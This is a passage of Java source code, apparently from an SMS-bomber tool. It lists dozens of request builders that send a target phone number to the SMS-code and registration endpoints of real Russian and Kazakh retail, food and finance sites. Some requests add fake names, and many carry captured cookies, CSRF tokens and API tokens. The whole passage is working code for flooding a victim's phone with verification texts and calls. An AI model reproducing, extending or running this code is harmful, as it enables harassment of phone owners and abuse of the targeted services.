D%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                            .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone.getPhone(), "+7 *** *** ** **\n") +
                                            "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://my.sravni.ru/signin/code") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("__RequestVerificationToken", "CfDJ8CweUVAmnVJNqszqP15xx-hitFFEfBAUJnGvIZBqF4kqdB5DijYyQ1u0JbRmCq1dmVlRFqphQ6HElnEEqCPG4scR5SV47pVWqKe2anjUFfDfInYU_PqxRR-YmP-jRR5i9RjiExsOMk6554nFT1bXJDw");
                    builder.add("phone", "+" + phone.toString());
                    builder.add("returnUrl", "/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20reviews%20esia%20orders.r%20messagesender.sms%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20Sravni.Affiliates.Service%20Sravni.News.Service&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=aKMJO_u7seq0O8Z9swoMZNCxPQII1BQ3BXIcID0uDko&amp;nonce=GmzCt6zbp1YnZf9QHMmPR05NvwI3Cftm5or6YISMk0E&amp;login_hint&amp;acr_values");

                    request.header("Cookie", "_ym_uid=1648230902270232651; _ym_d=1652720791; .ASPXANONYMOUS=Wj7EH3nLFEqyHYYidQ77qw; _SL_=6.39.924.2529.; _ipl=6.39.924.2529.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_ACCIDENTINSURANCE=Test_000157_A; AB_ACCIDENTINSURANCE_DIRECT=never; AB_CREDITSELECTION=Test_000166_A; AB_CREDITSELECTION_DIRECT=never; _cfuvid=TKf4a7o.NTcTPY_jj3zbB16KROEpLGVqG0Imwqu3TEI-1656577933373-0-604800000; _ym_isad=2; __cf_bm=_M1xArnm.U77LAsOK_KlLRVFXulIg3HMgd..c9EiIY0-1656577934-0-AUVp6iX2Hs51aaQy+D9IHzsnLsF/EPMFijHTey8FTyQglJrrtTXU6dFRUj0vxr+RcG2AVwMko93NHqnHzk8Bz0g5PgqLJIdFv9rIikiW8R4PnhOLGnKUuDUbHL1/jAu1HnRMhV0JYn7iQgTltY9+qVjvFAYsGm7xArMGnX91PQXUkYOY18FgSDJ5n+/DoE5BpA==; _ga_WE262B3KPE=GS1.1.1656577934.1.0.1656577934.60; _ga=GA1.2.1897499837.1656577935; _gid=GA1.2.923198233.1656577935; _gat_UA-8755402-16=1; _dc_gtm_UA-8755402-14=1; _gcl_au=1.1.1765525680.1656577935; tmr_lvidTS=1648230904449; tmr_lvid=dbd59ad03175fd34d0f64f769fd0a5fd; uid=UbGokWK9X4+oKCNlCFuNAg==; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8CweUVAmnVJNqszqP15xx-gMzc_APgAJ9lv4roObOleM7Ox8t2-vnQIlIJ-wYm7CCo8pj8IaZcFjEXe4o6mBvTybEccN7O-Aq8i7Z0iM9kfA0CCpVx-xprNiLnoRfIiWEMAq86LRrU2g-JUQ3RkFE_o; tmr_reqNum=11");
                }
            },

            new JsonService("https://api.totopizza.ru/graphql", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "requestPhoneCodeRegister");
                        json.put("query", "\n" +
                                "  mutation requestPhoneCodeRegister($telephone:String! $name:String!) {\n" +
                                "    requestPhoneCodeRegister(input: { telephone:$telephone name:$name })\n" +
                                "  }\n");
                        json.put("variables", new JSONObject()
                                .put("name", getRussianName())
                                .put("telephone", format(phone.getPhone(), "+7 *** *** ** **")));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://authorization.wildberries.eu/api/v2/code/request") {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("contact", phone.toString())
                                .put("auth_method", "sms")
                                .put("lang", "ru")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://www.meloman.kz/customer/account/loginAjaxSendCodePost/", 7, 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.toString(), "+*(***)***-**-**"));
                    builder.add("canSendCode", "true");

                    request.header("Cookie", "region_id=541; region_just_set=1; PHPSESSID=95op9q5fqiqtpe9lpjvl2vppti; _dyjsession=d7bue1pmo1esc1pwh9ls4n4xaffvofos; dy_fs_page=www.meloman.kz; _dy_csc_ses=d7bue1pmo1esc1pwh9ls4n4xaffvofos; _dy_c_exps=; _dycnst=dg; _gcl_au=1.1.968364781.1659694169; gtmSID=9c0d3871-4f7e-4cbf-84e8-65461e247307; _dyid=-8547831098967847242; _dycst=dk.w.c.ws.; _dy_geo=RU.EU.RU_.RU__; _dy_df_geo=Russia..; _ym_uid=1659694170872825852; _ym_d=1659694170; _dyfs=1659694169656; _dy_toffset=-2; _dy_user_has_affinity=false; _dy_cs_cookie_items=_dy_user_has_affinity; _ga_D0HJ8R9QS2=GS1.1.1659694173.1.0.1659694173.60; _ga=GA1.2.201777281.1659694173; _gid=GA1.2.752243899.1659694173; _dc_gtm_UA-6878519-34=1; _dc_gtm_UA-6878519-27=1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _dy_soct=362831.602231.1659694168*381808.640682.1659694169*398001.680451.1659694169.d7bue1pmo1esc1pwh9ls4n4xaffvofos*477267.869366.1659694169*667137.1280681.1659694173*687006.1315500.1659694173; form_key=sD1D3NfZDKwMH035; mage-cache-sessid=true; _ym_visorc=w; _ym_isad=2; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _tt_enable_cookie=1; _ttp=583af7f6-5be1-49b9-a34a-22708e1771de; _fbp=fb.1.1659694175101.931221081; form_key=sD1D3NfZDKwMH035; _dyid_server=-8547831098967847242; section_data_ids=%7B%22customer%22%3A1659694173%2C%22cart%22%3A1659694173%2C%22gtm%22%3A1659694173%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D");
                    request.header("x-requested-with", "XMLHttpRequest");
                }
            },

            new FormService("https://www.marwin.kz/customer/account/loginAjaxSendCodePost/", 7, 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.toString(), "+*(***)***-**-**"));
                    builder.add("canSendCode", "true");

                    request.header("Cookie", "PHPSESSID=7pihhl37dfce9gdhbl0bkcudri; region_id=541; region_just_set=1; _dyjsession=5mapeo024pg8uzy7akpsyo2cch7upwmg; dy_fs_page=www.marwin.kz%2Ffood-items%2Fsweets; _dy_csc_ses=5mapeo024pg8uzy7akpsyo2cch7upwmg; _dy_c_exps=; _dycnst=dg; _gcl_au=1.1.152707412.1659694545; gtmSID=3cf7f71e-5c85-4d3a-b86a-5636070822dc; _ga_ZTZ7V5HTWZ=GS1.1.1659694545.1.0.1659694545.60; _dyid=-8547831098967847242; _dyfs=1659694545099; _dycst=dk.w.c.ws.; _dy_geo=RU.EU.RU_.RU__; _dy_df_geo=Russia..; _dy_toffset=-3; _dy_user_has_affinity=false; _dy_cs_cookie_items=_dy_user_has_affinity; _dy_soct=374152.624393.1659694544*398002.680454.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*412140.712261.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*424158.741600.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*477269.869368.1659694545; _gid=GA1.2.118795237.1659694546; _ga=GA1.2.960427966.1659694545; _gat_UA-6878519-34=1; _dc_gtm_UA-6878519-28=1; _ym_uid=16596945461037912764; _ym_d=1659694546; _userGUID=0:l6gba444:eBIz3ljwEcsH2pVSU~modh8PqEc3wgg5; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _tt_enable_cookie=1; _ttp=fceedc0f-35e5-440f-819e-3add79b4b2d0; _ym_visorc=w; _ym_isad=2; form_key=JY5rra4s7wyHlJRV; _dyid_server=-8547831098967847242; mage-cache-sessid=true; _fbp=fb.1.1659694548127.1961207824; form_key=JY5rra4s7wyHlJRV; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=9d23496bf3ff7d8b37d61748f060f4eb; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; section_data_ids=%7B%22customer%22%3A1659694547%2C%22cart%22%3A1659694547%2C%22gtm%22%3A1659694548%7D");
                    request.header("x-requested-with", "XMLHttpRequest");
                }
            },

            new FormService("https://dostavka.marcellis.ru/tillypad/ajax_send_sms.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    builder.add("type", "code");
                    builder.add("add_param", "reg");

                    request.header("referer", "https://dostavka.marcellis.ru/");
                    request.header("x-requested-with", "XMLHttpRequest");
                    request.header("Cookie", " __ddg1_=jQEALz5FxzbM3z6tvm1b; PHPSESSID=n7tvem3ngi0f4bnqvjrmsfp3h4; user_basket_sessid=8e7b7083fc60e5b174316210a0b3c81f; user_basket_expire=1660304974; city_id=4; _ym_uid=165426810660645061; _ym_d=1659700178; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1659700178044.142071350; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.2061400920.1659700178; _gid=GA1.2.1308042754.1659700178");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://food-port.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                            .header("x-thapl-domain", "kronshtadt.food-port.ru")
                            .header("x-thapl-region-id", "2")
                            .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://starfishsushi.ru/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("sms_notification", "1");
                    builder.add("phone_notification", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://dobropizza.ru/ajaxopen/userregisterdobro", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("username", format(phone.getPhone(), "+7(***) ***-**-**"));
                    builder.add("sms", "0");
                    builder.add("cis", "57");
                }
            },

            new FormService("https://italiani.rest/local/templates/italini/PhoneAuth.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7(***)***-**-**"));
                    builder.add("type", "sendauth");
                }
            },

            new JsonService("https://api.eda1.ru/api/user/register", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("X-Api-Key", "6444100");
                    request.header("uuid", "796c26ae-8b7c-aac3-812a-34679393cd5e");

                    try {
                        return new JSONObject()
                                .put("phone", phone)
                                .put("verify_type", "call")
                                .put("password", "qwerty")
                                .put("password_repeat", "qwerty")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b");

                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://bankiros.ru/send-code/verify") {
                @Override
                public void buildParams(Phone phone) {
                    request.header("Cookie", "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D");
                    request.header("x-csrf-token", "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA==");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.addQueryParameter("action", "sendSms");
                    builder.addQueryParameter("phone", phone.toString());
                    builder.addQueryParameter("userIdentityId", "91445499");
                    builder.addQueryParameter("ga", "GA1.2.316605841.1659883653");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; __cfruid=5e7708e2f80d72738db410be7aee4e588e853f7c-1659885549; _ga=GA1.2.348103934.1659885585; _gid=GA1.2.2043862512.1659885585; tmr_lvid=e462f5f07dce35b045f464b2f70b516e; tmr_lvidTS=1656429758785; _ym_uid=1656429759333836542; _ym_d=1659885586; _ym_visorc=b; _ym_isad=2; tmr_detect=0%7C1659885587521; supportOnlineTalkID=GwJBk17SVDMh9IVIpEnrbvZdNdxdL86o; ec_id=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; tmr_reqNum=11");
                    request.header("x-device-uid", "14b4ccbc-9f0c-460e-b756-9edcf8cd68d2");
                    request.header("x-version-fe", "1659504023660");

                    try {
                        return new JSONObject()
                                .put("email", getEmail())
                                .put("firstName", getRussianName())
                                .put("lastName", getRussianName())
                                .put("middleName", getRussianName())
                                .put("phone", phone.toString())
                                .put("via", "sms")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://ekonika.ru/ajax/send_pin.php?site=s1", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("code", "+7");
                    builder.add("phone", format(phone.getPhone(), "***-***-**-**"));
                    builder.add("action", "check_phone");
                    builder.add("sessid", "872095e0ad9f4a57071206f27522ebf3");

                    request.header("Cookie", "PHPSESSID=h8kjcck5it0tmroijk8nb4b8gc; BITRIX_SM_SALE_UID=132055942; CURRENT_LOCATION_ID=84; tmr_lvid=9a5848ee1dfc8f1c8e24ac0974da6c45; tmr_lvidTS=1648577640949; _gcl_au=1.1.74417331.1659887245; _gid=GA1.2.147738900.1659887246; _dc_gtm_UA-4639319-9=1; __exponea_etc__=7ba5e873-baf0-46eb-9cfa-0ff8dd19d6bd; __exponea_time2__=-0.342989444732666; adtech_uid=38f63572-23b7-43ed-93df-fd1f3c09bc13%3Aekonika.ru; top100_id=t1.7643190.71867921.1659887248335; last_visit=1659876448344%3A%3A1659887248344; t3_sid_7643190=s1.1346509378.1659887248338.1659887248351.1.1.1.1; user-id_1.0.5_lr_lruid=pQ8AAJDe72JnDfYDASCavQA%3D; _ga=GA1.2.66145277.1659887246; tmr_reqNum=14; _ym_uid=1648577642564920923; _ym_d=1659887249; adrdel=1; _ym_isad=2; _ym_visorc=b; adrcid=AwfTyBdh6O3p9_z6Eu43FEQ; _dc_gtm_UA-8859472-12=1; tmr_detect=0%7C1659887251766; _tt_enable_cookie=1; _ttp=3136bdde-106d-4f05-abae-f80c2c3f9d80; _userGUID=0:l6ji0hg3:dbRLhi3cdUyiY999~ExNyi41OTMpiolj; dSesn=ada1e1d4-2286-d29d-9099-6f26b556234d; _dvs=0:l6ji0hg3:b0FmU1xPogEowKMeZ3oFn2blhUXuc84q; _ga_7NNZ59QE8F=GS1.1.1659887246.1.0.1659887254.52; WhiteCallback_visitorId=10598335571; WhiteCallback_visit=18357439556; WhiteSaas_uniqueLead=no; WhiteCallback_openedPages=qncoK; WhiteCallback_mainPage=qncoK; WhiteCallback_timeAll=11; WhiteCallback_timePage=11");
                }
            },

            new JsonService("https://poisondrop.ru/auth/identification") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "uid_nginx=Td9qlWLv318cek+/BFgHAg==; pages-count=1; _rc=35866e19f64d450cb27dfbbc83d2842c; rrpvid=126161669300486; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=f61782d4-35d2-4580-a56e-f683ea3662e9; _ga=GA1.2.1422373646.1659887459; _gid=GA1.2.960835624.1659887459; _dc_gtm_UA-42461087-1=1; _spx=eyJpZCI6Ijc0OTc4ZTA5LTg4ODItNGQ5Yy1iYzY5LTJjYzcyMjc1MzdlNCIsImZpeGVkIjp7InN0YWNrIjpbMF19fQ%3D%3D; geolocation=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%20%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%2C%20undefined%2C%20null%2C%20null; watch-geo-autodetect=1; _tt_enable_cookie=1; _ttp=c2cc1192-a756-4261-accd-2c5cf665bc1a; rcuid=6275fcd65368be000135cd22; XSRF-TOKEN=eyJpdiI6IlRxVGxwM21rYkRvblh1d0g2VUFjdEE9PSIsInZhbHVlIjoieU13RXRiWlRoRE95OW5ZbHEvVi81T0FDVmgrTDJkMnBrZEZxYlJUV0dVazhaenMzckxBWnBodDA3SmxsQzNWZng0dVMwNWlYL2dKT3NyS3NhTmNiTGJhMW4vNTBnNUl6M0p6TkNUeVJXNXlmSGNVaVB5elBrVFFucUQ1eFZFUU8iLCJtYWMiOiI1OGZjYWMwNmZlOWRmYWQ3NGFjYmZkNWQzYzliOGYzZDMyMTYyNWRjMDUwYzRlOGVjYmYwZTg1MDAzOTIxYTE4In0%3D; poisondrop_session=eyJpdiI6Im5zbzMvL0dNemhsc25pMTViQWZrR0E9PSIsInZhbHVlIjoiKzV4RHJDYWFwNXJYUUFURllpWjdpWWtIdWkvck1PalpBRzNnei8xN2x4Z0tNNjF6a0NxdFo5THQ5Y2hPbnRqajRyK2wyYUJBTVM2cXRMbTBxcktkamJaeHBoNzZhN0VVWDVJOGxmeFp5MURLZmpjZDMzbmpoNWhPM1IvK3h6d0UiLCJtYWMiOiI4NTIyN2Q0NDdmNzAxZjJkOGUyMWQ1MzUyM2FkMzRmMjhkZWMzNGUwMThjMjE2YjM2OWM5ZDZiZTgzNjQzMDYxIn0%3D; _ym_uid=1659887461171834329; _ym_d=1659887461; _fbp=fb.1.1659887461362.223190319; _ym_isad=2; _ym_visorc=w; adrdel=1; adrcid=A695HNSwX8LpzwoiuYtw6dA; rrwpswu=true; cookie-agreement=false");
                    request.header("X-XSRF-TOKEN", "eyJpdiI6IlRxVGxwM21rYkRvblh1d0g2VUFjdEE9PSIsInZhbHVlIjoieU13RXRiWlRoRE95OW5ZbHEvVi81T0FDVmgrTDJkMnBrZEZxYlJUV0dVazhaenMzckxBWnBodDA3SmxsQzNWZng0dVMwNWlYL2dKT3NyS3NhTmNiTGJhMW4vNTBnNUl6M0p6TkNUeVJXNXlmSGNVaVB5elBrVFFucUQ1eFZFUU8iLCJtYWMiOiI1OGZjYWMwNmZlOWRmYWQ3NGFjYmZkNWQzYzliOGYzZDMyMTYyNWRjMDUwYzRlOGVjYmYwZTg1MDAzOTIxYTE4In0=");

                    try {
                        return new JSONObject()
                                .put("ident_method", "PHONE")
                                .put("login", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://piudelcibo.ru/accounts/send-phone-verification-code") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "piu_cookies_on=1; _pdc_sess=a74380a965268a456c527b5fc01bb2ee; _ga=GA1.2.1841923065.1659887858; _gid=GA1.2.709976267.1659887858; _gat=1; _gat_gtag_UA_129511264_1=1; _gat_gtag_UA_56813273_1=1; _ym_uid=1659887861410760858; _ym_d=1659887861; _ym_isad=2; _ym_visorc=w");
                    request.header("x-csrf-token", "cfyXgDOSpJmL+tlp3KSVYCSyB0uUMqxmxUlYN1SRzt6HNgqmJ838pA3vAw0/sPic+YDUQuaEDIE1RmfQP1IZuQ==");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                            .post(RequestBody.create("------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"flag\"\n" +
                                    "\n" +
                                    "check_login\n" +
                                    "------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"tel\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** **-**") +
                                    "\n------WebKitFormBoundaryZqudgny7DXMMKMxU--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://lord-craft.ru/user_account/ajax.php?do=sms_code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "8(***)***-**-**"));
                }
            },

